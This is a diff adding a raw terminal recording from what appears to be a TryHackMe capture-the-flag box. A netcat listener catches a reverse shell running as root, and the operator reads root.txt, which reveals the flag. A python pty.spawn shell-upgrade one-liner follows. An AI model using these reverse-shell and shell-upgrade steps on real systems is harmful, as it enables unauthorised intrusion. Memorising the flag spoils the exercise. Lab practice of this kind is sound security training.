@@ -1,0 +1,20 @@
+Script started on 2025-02-14 23:19:44+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 5731
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=0(root) gid=0(root) groups=0(root)
+[K[K[?2004hcd /root[?2004l[K[?2004hcd /root
+[K[K[?2004hls[?2004l[K[?2004hls
+[Kroot.txt
+[K[K[?2004hcat root.txt[?2004l[K[?2004hcat root.txt
+[KTHM{G00D_J0B_G3++1NG+H3R3!}
+[K[K[?2004hwhio[Kch python[?2004l[K[?2004hwhich python
+[K/usr/bin/python
+[K[K[?2004hwhich python3[?2004l[K[?2004hwhich python3
+[K/usr/bin/python3
+[K[K[?2004hpython3 -c "import pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c "import pty;pty.spawn("/bin/bash")'
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K
+[?2004l
+Script done on 2025-02-14 23:22:18+03:00 [COMMAND_EXIT_CODE="1"]
